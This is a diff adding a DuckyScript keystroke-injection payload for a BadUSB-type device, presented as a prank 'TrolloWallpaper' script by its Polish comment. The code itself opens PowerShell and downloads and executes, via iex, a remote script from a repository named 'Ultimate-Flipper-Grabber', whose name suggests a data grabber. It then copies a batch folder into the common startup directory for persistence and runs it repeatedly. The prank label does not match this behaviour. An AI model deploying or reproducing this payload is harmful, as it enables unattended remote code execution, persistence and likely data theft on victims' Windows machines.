@@ -1,0 +1,60 @@
+REM Title: TrolloWallpaper
+REM Autor: 8ad3rror
+REM Info[PL]: Ściąga tapete trollo.jpg i AutoWall.bat do folderu na dysku C, przenosi AutoWall.bat do autostartu i uruchamia go
+REM Test Win10
+
+DELAY 100
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
+ENTER
+DELAY 1000
+
+STRING EXIT
+ENTER
+DELAY 100
+GUI r
+STRING C:\AutoWall
+ENTER
+DELAY 500
+STRING a
+DELAY 100
+CTRL C
+DELAY 100
+ALT F4
+DELAY 200
+GUI r
+STRING shell:common startup
+ENTER
+DELAY 500
+CTRL V
+DELAY 500
+ENTER
+DELAY 2000
+ALT F4
+DELAY 200
+GUI d
+
+GUI r
+DELAY 100
+STRING C:\AutoWall\AutoWall.bat
+ENTER
+DELAY 500
+GUI r
+DELAY 100
+STRING C:\AutoWall\AutoWall.bat
+ENTER
+DELAY 500
+GUI r
+DELAY 100
+STRING C:\AutoWall\AutoWall.bat
+ENTER
+DELAY 500
+
+
+GUI d
+
